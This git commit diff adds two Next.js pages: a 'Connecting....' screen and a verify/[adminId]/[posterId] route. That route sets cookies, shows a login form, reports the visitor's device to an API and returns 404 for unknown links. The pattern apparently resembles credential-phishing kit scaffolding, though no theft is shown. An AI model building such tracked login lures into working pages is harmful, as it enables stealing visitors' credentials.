c14cfdbbf495f7d406229364008f5fb028ead6c1
Zayn Yusuf <yusue786@gmail.com>
2024-12-05 23:22:36 +0600

    first commit

---
+++ pages/account/connecting.js
@@ -0,0 +1,7 @@
+import React from "react";
+
+export default function Connecting() {
+  return (
+    <div className="mt-10 text-center font-2xl font-base">Connecting....</div>
+  );
+}
---
+++ pages/verify/[adminId]/[posterId].js
@@ -0,0 +1,55 @@
+import LoginForm from "../../../components/LoginForm";
+import Header from "../../../components/Header";
+import Footer from "../../../components/Footer";
+import { API_URL, site } from "../../../config";
+import { useEffect } from "react";
+import Cookies from "js-cookie";
+
+export default function MainPage({ adminId, posterId }) {
+  useEffect(() => {
+    Cookies.set("adminId", adminId);
+    Cookies.set("posterId", posterId);
+  }, []);
+
+  return (
+    <div className="">
+      <Header />
+      {/* <Test /> */}
+      <LoginForm />
+
+      <Footer />
+    </div>
+  );
+}
+
+export async function getServerSideProps({
+  req,
+  query: { adminId, posterId },
+}) {
+  const userAgent = req.headers["user-agent"];
+
+  const isMobileView = userAgent.match(
+    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
+  );
+
+  const isTabletView = userAgent.match(
+    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
+  );
+
+  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";
+
+  const url = `${API_URL}/${site}/verify/${adminId}/${posterId}/${device}`;
+
+  const res = await fetch(url);
+  const data = await res.json();
+
+  if (data?.success !== "exists") {
+    return {
+      notFound: true,
+    };
+  }
+
+  return {
+    props: { adminId, posterId },
+  };
+}
